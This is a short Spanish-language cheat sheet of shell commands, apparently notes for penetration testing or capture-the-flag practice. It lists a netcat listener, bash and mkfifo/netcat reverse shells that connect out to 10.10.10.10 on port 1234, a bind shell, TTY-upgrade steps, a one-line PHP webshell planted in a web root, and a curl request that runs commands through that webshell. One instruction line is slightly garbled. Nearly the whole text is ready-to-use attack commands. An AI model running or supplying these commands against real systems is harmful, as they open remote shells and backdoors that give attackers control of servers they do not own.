--------------------------------------------------------------------------
#shell #revshell 

---------

|                                                                                    |                                                                    |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| **Uso de shells**                                                                  |                                                                    |
| `nc -lvnp 1234`                                                                    | Iniciar un agente de escucha en un puerto local`nc`                |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                              | Enviar un shell inverso desde el servidor remoto                   |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Otro comando para enviar un shell inverso desde el servidor remoto |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`      | Iniciar un shell de enlace en el servidor remoto                   |
| `nc 10.10.10.1 1234`                                                               | Conexión a un shell de enlace iniciado en el servidor remoto       |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                   | Shell de actualización TTY (1)                                     |
| `ctrl+z` luego luego luego dos veces`stty raw -echo``fg``enter`                    | Shell de actualización TTY (2)                                     |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                  | Crear un archivo php de webshell                                   |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                      | Ejecutar un comando en un webshell cargado                         |
